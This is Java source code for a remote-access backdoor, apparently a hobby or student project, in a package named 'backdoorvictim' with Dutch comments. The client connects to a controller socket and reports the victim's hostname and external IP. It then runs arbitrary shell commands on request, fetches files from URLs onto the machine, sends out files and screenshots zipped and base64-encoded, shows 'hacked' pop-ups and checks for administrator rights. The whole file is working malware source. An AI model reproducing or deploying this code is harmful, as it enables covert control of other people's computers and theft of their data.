package backdoorvictim;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;

public class Victim implements Runnable {

    // Declaration section
    // clientClient: the client socket
    // os: the output stream
    // is: the input stream
    static Socket clientSocket = null;
    static PrintStream os = null;
    static DataInputStream is = null;
    static BufferedReader inputLine = null;
    static boolean closed = false;
    private static String ip = "";
    private static String whoami = "";
    private static String OS = System.getProperty("os.name").toLowerCase();
    private static File temp;

    public static void main(String[] args) throws UnknownHostException, InterruptedException {

        // The default port
        int port_number = 4600;
        String host = "localhost";

        String hostname = InetAddress.getLocalHost().getHostName(); // find the hostname from computer
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com"); // checkt the external ip from the computer.
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            ip = in.readLine();

        } catch (Exception e) {
            ip = "noip";
        }
        whoami = hostname + "@" + ip + " ";

        System.out.println("Connecting to " + host + " on port " + port_number + "...");

        try {
            clientSocket = new Socket(host, port_number);
            inputLine = new BufferedReader(new InputStreamReader(System.in));
            os = new PrintStream(clientSocket.getOutputStream());
            is = new DataInputStream(clientSocket.getInputStream());
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + host);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to the host " + host);
        }
        if (clientSocket != null && os != null && is != null) {
            try {

                new Thread(new Victim()).start();

                while (!closed) {
                    // lees een regel text.
                    int a = 'a';
                    String s = "";
                    long begin = System.currentTimeMillis();
                    do {
                        if (System.currentTimeMillis() - begin > 10000) {
                            begin = System.currentTimeMillis();
                            os.println("ping");
                        }
                        if (inputLine.ready()) {
                            a = inputLine.read();
                            if (a != 10) {
                                s = s + (char) a;
                            }
                        }
                    } while (a != 10);
                    os.println(s);

                }

                os.close();
                is.close();
                clientSocket.close();
            } catch (IOException e) {
                System.err.println("IOException:  " + e);
            }
        }
    }

    public void run() {
        String responseLine;

        try {
            while ((responseLine = is.readLine()) != null) {
                System.out.println(responseLine);
                if (responseLine.contains(whoami + "shell ")) {
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 15;
                    String s = responseLine.substring(i);
                    os.println(ExecuteMyCommand(responseLine.substring(i)));
                }
                if (responseLine.contains(whoami + "upload ")) {
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 16;
                    String s = responseLine.substring(i);
                    os.println("location of file is: " + upload(s));
                }
                if (responseLine.contains(whoami + "javaversion")) {
                    os.println("java version from " + whoami + " is: " + System.getProperty("java.version"));
                }
                if (responseLine.contains(whoami + "download ")) {
                    //int i = whoami.length() * 2 + 8;
                    int i = whoami.length() + 18;
                    String s = responseLine.substring(i);
                    os.println("downloadeble file = " + download(s));
                }

                if (responseLine.contains(whoami + "screenshot")) {
                    os.println("screenshot: " + screenshot());
                }

                if (responseLine.contains(whoami + "msgbox")) {
                    try {
                        int i = whoami.length() + 16;
                        String s = responseLine.substring(i);
                        if (OS.contains("linux")) {
                            os.println("sending msgbox");
                            ExecuteMyCommand("zenity --error --text=\"" + s + "\\!\" --title=\"Warning\\!\"");
                            os.println("answer msgbox succes");
                        } else if (OS.contains("windows")) {
                            os.println("sending msgbox");
                            ExecuteMyCommand("mshta \"javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( '" + s + "', 10, 'hacked', 64 );close()\"");
                            os.println("answer msgbox succes");
                        } else {
                            os.println("sending msgbox possibly faild");
                        }

                    } catch (Exception e) {
                        os.println("sending msgbox faild");
                    }
                }

                if (responseLine.contains("list info")) {
                    if (OS.contains("windows")) {
                        if (isAdmin() == true) {
                            os.println("online " + whoami + " = " + OS + " admin?= administrator");
                        } else {
                            os.println("online " + whoami + " = " + OS + " = admin?= not administrator");
                        }
                    }else{
                        os.println("online " + whoami + " = " + OS + " = admin?= ???");
                    }

                }

                if (responseLine.contains(whoami + "exit")) {
                    System.exit(0);

                }
            }
              
        } catch (IOException e) {
            System.err.println("IOException:  " + e);

        } catch (AWTException ex) {
            Logger.getLogger(Victim.class.getName()).log(Level.SEVERE, null, ex);
        }

        System.err.println("Connection lost from " + whoami);
        closed = true;
    }

    public static String ExecuteMyCommand(String commando) { // hier sturen we ons command ( voorbeeld "dir" als commando)

        try {
            if (commando.length() < 1) {
                return "Geen commndo probeer opnieuw.";
            }
            String outputlines = "";
            if (OS.contains("windows")) {
                Process p = Runtime.getRuntime().exec("cmd /c " + commando);
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

                String regel = "";
                while ((regel = br.readLine()) != null) {
                    outputlines += regel + "\n"; // System.err.println(regel);
                }
                return outputlines;
            }
            Process p = Runtime.getRuntime().exec(commando);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String regel = "";
            while ((regel = br.readLine()) != null) {
                outputlines += regel + "\n"; // System.err.println(regel);
            }
            return outputlines;

        } catch (IOException ex) {
            return ex.getMessage();
        }
    }

    public static boolean isAdmin() { // checken of de user een administrator is. werkt alleen met windows
        String groups[] = (new com.sun.security.auth.module.NTSystem()).getGroupIDs();
        for (String group : groups) {
            if (group.equals("S-1-5-32-544")) {
                return true;
            }
        }
        return false;
    }

    public static String upload(String file) throws IOException { // uploaden naar victim via url
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        URL url = new URL(file);
        InputStream in = url.openStream();
        Files.copy(in, Paths.get(temp.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);
        in.close();
        return temp.getAbsolutePath();

    }

    public static String download(String file) throws IOException { // downloaden van victim naar server
        try {
            File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
            Path fileLocationzip = Paths.get(ziptemp.toString());

            // input file 
            FileInputStream in = new FileInputStream(file);

            // out put file 
            ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));

            // name the file inside the zip  file 
            out.putNextEntry(new ZipEntry("file"));

            // buffer size
            byte[] b = new byte[1024];
            int count;

            while ((count = in.read(b)) > 0) {
                out.write(b, 0, count);
            }
            out.close();
            in.close();

            byte[] zipdata = Files.readAllBytes(fileLocationzip);
            String base64encoded = Base64.getEncoder().encodeToString(zipdata);
            return base64encoded;
        } catch (IOException e) {
            System.err.println("file doesnt exist");
        }
        return "";
    }

    public static String screenshot() throws IOException, AWTException { // een screenshot nemen van het standart scherm en sturen naar server.
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screenRect);
        ImageIO.write(capture, "bmp", new File(temp.toString()));
        Path fileLocationzip = Paths.get(ziptemp.toString());
        // input file 
        FileInputStream in = new FileInputStream(temp);

        // out put file 
        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));

        // name the file inside the zip  file 
        out.putNextEntry(new ZipEntry("screenshot.bmp"));

        // buffer size
        byte[] b = new byte[1024];
        int count;

        while ((count = in.read(b)) > 0) {
            out.write(b, 0, count);
        }
        out.close();
        in.close();

        byte[] data = Files.readAllBytes(fileLocationzip);
        String base64encoded = Base64.getEncoder().encodeToString(data);
        return base64encoded;
//
//        
//        

    }
    

//    public static String webcamshot() throws IOException, AWTException {
//        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
//
//        // not compleet here the picture placing!
//        File ziptemp = File.createTempFile("temp", Long.toString(System.nanoTime()));
//        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
//        BufferedImage capture = new Robot().createScreenCapture(screenRect);
//        ImageIO.write(capture, "bmp", new File(temp.toString()));
//        Path fileLocationzip = Paths.get(ziptemp.toString());
//        // input file 
//        FileInputStream in = new FileInputStream(temp);
//
//        // out put file 
//        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(ziptemp));
//
//        // name the file inside the zip  file 
//        out.putNextEntry(new ZipEntry("webcamshot.png"));
//
//        // buffer size
//        byte[] b = new byte[1024];
//        int count;
//
//        while ((count = in.read(b)) > 0) {
//            out.write(b, 0, count);
//        }
//        out.close();
//        in.close();
//
//        byte[] data = Files.readAllBytes(fileLocationzip);
//        String base64encoded = Base64.getEncoder().encodeToString(data);
//        return base64encoded;
//
//        
//        

    

//    public static void Base64DecodeAndExtractZip(String a) throws IOException {
//        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
//        byte[] Decoded = Base64.getDecoder().decode(a);
//        FileOutputStream fos = new FileOutputStream(temp);
//        fos.write(Decoded);
//        fos.close();
//        System.out.println("location of file or picture: " + zipextract(temp.toString()));
//    }
//
//    public static String zipextract(String z) {
//        File dir = new File(temp + "folder");
//        try {
//            ZipFile zipFile = new ZipFile(temp.getAbsolutePath());
//            zipFile.extractAll(temp.getAbsolutePath() + "folder");
//        } catch (ZipException e) {
//            e.printStackTrace();
//        }
//        return temp + "folder";
//    }

}
